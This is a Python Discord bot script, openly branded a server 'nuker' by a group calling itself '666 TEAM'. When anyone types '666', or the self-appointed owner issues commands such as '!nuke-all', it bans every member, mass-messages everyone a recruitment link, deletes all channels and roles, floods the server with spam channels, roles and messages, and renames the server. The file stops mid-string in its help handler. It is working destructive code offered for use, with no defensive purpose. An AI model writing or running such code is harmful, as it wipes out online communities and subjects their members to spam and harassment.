#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 666 TEAM NUKER X - DISCORD SERVER DESTROYER 💀                                                                                    ║
║                    TYPE "666" = INSTANT BAN + TOTAL DESTRUCTION                                                                         ║
║                    👑 POWERED BY 666 TEAM - VON 👑                                                                                      ║
║                    🔗 https://discord.gg/k3P8kWQag 🔗                                                                                    ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord.ext import commands
import asyncio
import random
import time
import os
import sys
import threading
from datetime import datetime

TOKEN = None
OWNER_ID = None
NUKE_TRIGGER = "666"
DISCORD_LINK = "https://discord.gg/k3P8kWQag"
TEAM_NAME = "666 TEAM - VON"

MAX_THREADS = 5000
DM_DELAY = 0.001

# رسالة خاصة لكل عضو - تحتوي على رابط الدعوة
DM_MESSAGE = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║      ██████╗  ██████╗  ██████╗                                     ║
║      ██╔══██╗██╔═══██╗██╔═══██╗                                    ║
║      ██║  ██║██║   ██║██║   ██║                                    ║
║      ██║  ██║██║   ██║██║   ██║                                    ║
║      ██████╔╝╚██████╔╝╚██████╔╝                                    ║
║      ╚═════╝  ╚═════╝  ╚═════╝                                     ║
║                                                                      ║
║     💀 YOU HAVE BEEN TERMINATED BY 666 TEAM 💀                       ║
║     🔥 YOUR SERVER IS NOW COMPLETELY DESTROYED 🔥                    ║
║     👑 666 TEAM - VON CONTROLS EVERYTHING 👑                        ║
║                                                                      ║
║     🐉 JOIN THE 666 TEAM: {DISCORD_LINK} 🐉                         ║
║                                                                      ║
║     ☠️ THIS IS THE POWER OF 666 TEAM ☠️                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

class UltimateNuker:
    def __init__(self):
        self.total_banned = 0
        self.total_dm_sent = 0
        self.total_channels_deleted = 0
        self.total_roles_deleted = 0
        self.total_spam_sent = 0
        self.nuked_servers = []
        self.is_nuking = False
        self.start_time = None
        
    async def ban_all_members_first(self, guild):
        """الخطوة 1: حظر جميع الأعضاء أولاً"""
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        success = 0
        fail = 0
        
        def ban_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.ban(reason="666 TEAM - TOTAL ANNIHILATION"), bot.loop)
                future.result(timeout=2)
                success += 1
                print(f"[BAN] Banned: {member.name}")
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=ban_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(0.0005)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_banned += success
        return success, fail
    
    async def mass_dm_everyone(self, guild):
        """الخطوة 2: إرسال رسائل للجميع مع رابط الدعوة"""
        members = [m for m in guild.members if not m.bot]
        success = 0
        fail = 0
        
        def send_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
                future.result(timeout=1)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=send_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(DM_DELAY)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_dm_sent += success
        return success, fail
    
    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
            except:
                pass
        self.total_channels_deleted += count
        return count
    
    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    count += 1
                except:
                    pass
        self.total_roles_deleted += count
        return count
    
    async def create_spam_channels(self, guild):
        channels = []
        spam_names = [
            "666-team", "destroyed-by-666", "666-was-here",
            "von-666", "666-nuker", "team-666",
            "666-rules", "destroyed-666", "666-annihilation",
            "666-power", "von-666-team"
        ]
        for i in range(150):
            try:
                name = random.choice(spam_names) + f"-{random.randint(1,999)}"
                channel = await guild.create_text_channel(name)
                channels.append(channel)
            except:
                pass
        return channels
    
    async def spam_all_channels(self, guild):
        spam_messages = [
            f"💀💀💀 666 TEAM WAS HERE 💀💀💀\n🔗 JOIN: {DISCORD_LINK}",
            f"🔥🔥🔥 SERVER DESTROYED BY 666 TEAM 🔥🔥🔥\n🔗 JOIN: {DISCORD_LINK}",
            f"👑👑👑 666 TEAM - VON CONTROLS EVERYTHING 👑👑👑\n🔗 JOIN: {DISCORD_LINK}",
            f"💀💀💀 TOTAL ANNIHILATION BY 666 TEAM 💀💀💀\n🔗 JOIN: {DISCORD_LINK}",
            f"🐉🐉🐉 666 TEAM THE DESTROYER 🐉🐉🐉\n🔗 JOIN: {DISCORD_LINK}",
            f"💀 666 NUKE COMPLETE 💀\n🔗 {DISCORD_LINK}",
            f"🔥 666 TEAM = ABSOLUTE POWER 🔥\n🔗 {DISCORD_LINK}",
            f"👑 ALL HAIL 666 TEAM 👑\n🔗 {DISCORD_LINK}",
            f"💀 YOUR SERVER IS NOW 666 TERRITORY 💀\n🔗 {DISCORD_LINK}",
            f"🔥 DESTROYED BY 666 NUKE 🔥\n🔗 {DISCORD_LINK}"
        ]
        total = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(50):
                    try:
                        msg = random.choice(spam_messages) + f" | {random.randint(1,999999)}"
                        await channel.send(msg)
                        total += 1
                        self.total_spam_sent += 1
                        await asyncio.sleep(0.005)
                    except:
                        pass
        return total
    
    async def rename_server(self, guild):
        try:
            await guild.edit(name="💀 DESTROYED BY 666 TEAM - VON 💀")
        except:
            pass
    
    async def change_all_nicknames(self, guild):
        count = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.edit(nick="💀 666 TEAM SLAVE 💀")
                    count += 1
                except:
                    pass
        return count
    
    async def create_spam_roles(self, guild):
        count = 0
        role_names = [
            "666 TEAM", "DESTROYED", "NUKE", "666 MAFIA",
            "DEATH", "ANNIHILATION", "POWER", "VON"
        ]
        for i in range(50):
            try:
                name = random.choice(role_names) + f"-{i}"
                await guild.create_role(name=name)
                count += 1
            except:
                pass
        return count
    
    async def ultimate_nuke(self, guild):
        if self.is_nuking:
            return None
        
        self.is_nuking = True
        results = {
            'banned': 0,
            'banned_failed': 0,
            'dm_sent': 0,
            'dm_failed': 0,
            'channels_deleted': 0,
            'roles_deleted': 0,
            'spam_roles_created': 0,
            'spam_channels': 0,
            'spam_messages': 0,
            'nicknames_changed': 0
        }
        
        try:
            print(f"\n{'='*60}")
            print(f"[NUKE] 666 TEAM NUKER ACTIVATED ON: {guild.name}")
            print(f"[NUKE] Total Members: {len(guild.members)}")
            print(f"{'='*60}\n")
            
            print("[STEP 1] BANNING ALL MEMBERS...")
            results['banned'], results['banned_failed'] = await self.ban_all_members_first(guild)
            print(f"[STEP 1] COMPLETE! Banned: {results['banned']} members\n")
            
            print("[STEP 2] SENDING MASS DMS WITH DISCORD LINK...")
            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(guild)
            print(f"[STEP 2] COMPLETE! DM Sent: {results['dm_sent']}\n")
            
            print("[STEP 3] CHANGING ALL NICKNAMES...")
            results['nicknames_changed'] = await self.change_all_nicknames(guild)
            print(f"[STEP 3] COMPLETE! Nicknames changed: {results['nicknames_changed']}\n")
            
            print("[STEP 4] DELETING ALL ROLES...")
            results['roles_deleted'] = await self.delete_all_roles(guild)
            print(f"[STEP 4] COMPLETE! Roles deleted: {results['roles_deleted']}\n")
            
            print("[STEP 5] CREATING SPAM ROLES...")
            results['spam_roles_created'] = await self.create_spam_roles(guild)
            print(f"[STEP 5] COMPLETE! Spam roles created: {results['spam_roles_created']}\n")
            
            print("[STEP 6] DELETING ALL CHANNELS...")
            results['channels_deleted'] = await self.delete_all_channels(guild)
            print(f"[STEP 6] COMPLETE! Channels deleted: {results['channels_deleted']}\n")
            
            print("[STEP 7] CREATING SPAM CHANNELS...")
            spam_channels = await self.create_spam_channels(guild)
            results['spam_channels'] = len(spam_channels)
            print(f"[STEP 7] COMPLETE! Spam channels created: {results['spam_channels']}\n")
            
            print("[STEP 8] SPAMMING ALL CHANNELS...")
            results['spam_messages'] = await self.spam_all_channels(guild)
            print(f"[STEP 8] COMPLETE! Spam messages sent: {results['spam_messages']}\n")
            
            print("[STEP 9] RENAMING SERVER...")
            await self.rename_server(guild)
            print(f"[STEP 9] COMPLETE! Server renamed\n")
            
            self.nuked_servers.append(guild.name)
            
            print(f"\n{'='*60}")
            print(f"[NUKE] 666 TEAM NUKE COMPLETED ON: {guild.name}")
            print(f"[NUKE] Total Banned: {results['banned']}")
            print(f"[NUKE] Total DM Sent: {results['dm_sent']}")
            print(f"[NUKE] Total Spam: {results['spam_messages']}")
            print(f"{'='*60}\n")
            
        except Exception as e:
            print(f"Error during nuke: {e}")
        finally:
            self.is_nuking = False
        
        return results

nuker = UltimateNuker()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    try:
        await bot.user.edit(username="💀 666 TEAM NUKER 💀")
    except:
        pass
    
    await bot.change_presence(activity=discord.Game(name="💀 TYPE 666 TO NUKE 💀"))
    
    try:
        await bot.user.edit(bio="🔥 666 TEAM - DISCORD DESTROYER 🔥")
    except:
        pass
    
    nuker.start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     💀 666 TEAM NUKER X - ACTIVATED 💀                                                                                                   ║
║                                                                                                                                          ║
║  🤖 BOT NAME: 💀 666 TEAM NUKER 💀                                                                                                        ║
║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds)}                                                                          ║
║  🔗 DISCORD LINK: {DISCORD_LINK}                                                                                                        ║
║                                                                                                                                          ║
║  ⚡ TRIGGER: Type "666" in ANY server = INSTANT TOTAL DESTRUCTION ⚡                                                                      ║
║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
║  🔗 EVERY DM WILL CONTAIN THE DISCORD LINK 🔗                                                                                            ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    print("\n💀 666 TEAM NUKER IS READY - WAITING FOR '666'... 💀\n")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    global OWNER_ID
    
    if OWNER_ID is None:
        OWNER_ID = message.author.id
        print(f"\n👑 MASTER OWNER SET: {message.author} (ID: {OWNER_ID})\n")
        await message.channel.send(f"""```👑 YOU ARE NOW THE 666 TEAM MASTER OWNER!
💀 Type '666' in any server to destroy it completely!
🔗 Discord Link: {DISCORD_LINK}```""")
        return
    
    if message.author.id == OWNER_ID and message.content.startswith('!'):
        await handle_owner_command(message)
        return
    
    if message.content.lower().strip() == NUKE_TRIGGER:
        guild = message.guild
        if guild and not nuker.is_nuking:
            print(f"\n💀💀💀 666 TEAM NUKE TRIGGERED in {guild.name} by {message.author} 💀💀💀\n")
            await message.channel.send(f"""```🔥 666 TEAM NUKE ACTIVATED!
📋 Steps:
1️⃣ Banning all members...
2️⃣ Sending mass DMs with invite link...
3️⃣ Destroying everything...

💀 TOTAL DESTRUCTION IN PROGRESS 💀
🔗 {DISCORD_LINK}```""")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"""```
💀 666 TEAM NUKE COMPLETE! 💀

✅ Banned: {results['banned']} members
✅ DM Sent: {results['dm_sent']} members
✅ Nicknames Changed: {results['nicknames_changed']}
✅ Roles Deleted: {results['roles_deleted']}
✅ Spam Roles Created: {results['spam_roles_created']}
✅ Channels Deleted: {results['channels_deleted']}
✅ Spam Channels Created: {results['spam_channels']}
✅ Spam Messages Sent: {results['spam_messages']}

🔥 SERVER COMPLETELY DESTROYED BY 666 TEAM 🔥
🔗 JOIN: {DISCORD_LINK}
```""")

async def handle_owner_command(message):
    content = message.content.lower()
    
    if content == '!servers':
        if not bot.guilds:
            await message.channel.send("No servers!")
            return
        server_list = []
        for i, guild in enumerate(bot.guilds, 1):
            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
        for chunk in chunks:
            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
    
    elif content.startswith('!nuke-server'):
        try:
            parts = content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: !nuke-server <number>")
                return
            number = int(parts[1])
            if number < 1 or number > len(bot.guilds):
                await message.channel.send(f"Invalid! Choose 1-{len(bot.guilds)}")
                return
            guild = bot.guilds[number - 1]
            await message.channel.send(f"💀 666 TEAM NUKING {guild.name}...")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
        except:
            await message.channel.send("Invalid number!")
    
    elif content == '!nuke':
        if message.guild:
            await message.channel.send(f"💀 666 TEAM NUKING {message.guild.name}...")
            results = await nuker.ultimate_nuke(message.guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
    
    elif content == '!nuke-all':
        await message.channel.send(f"💀 666 TEAM GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
        total_banned = 0
        for guild in bot.guilds:
            results = await nuker.ultimate_nuke(guild)
            if results:
                total_banned += results['banned']
        await message.channel.send(f"✅ COMPLETE! Total Banned: {total_banned}")
    
    elif content == '!stats':
        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        await message.channel.send("```")
        await message.channel.send("╔══════════════════════════════════════════════════════════╗")
        await message.channel.send("║           666 TEAM NUKER - STATISTICS                     ║")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send(f"║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}")
        await message.channel.send(f"║  🔨 TOTAL BANNED: {nuker.total_banned:,}")
        await message.channel.send(f"║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}")
        await message.channel.send(f"║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}")
        await message.channel.send(f"║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}")
        await message.channel.send(f"║  💬 SPAM SENT: {nuker.total_spam_sent:,}")
        await message.channel.send(f"║  ⏱️ UPTIME: {hours}h {minutes}m")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send(f"║  🔗 DISCORD LINK: {DISCORD_LINK}")
        await message.channel.send("║  💀 666 TEAM - ABSOLUTE POWER 💀")
        await message.channel.send("╚══════════════════════════════════════════════════════════╝")
        await message.channel.send("```")
    
    elif content == '!help':
        await message.channel.send(f"""
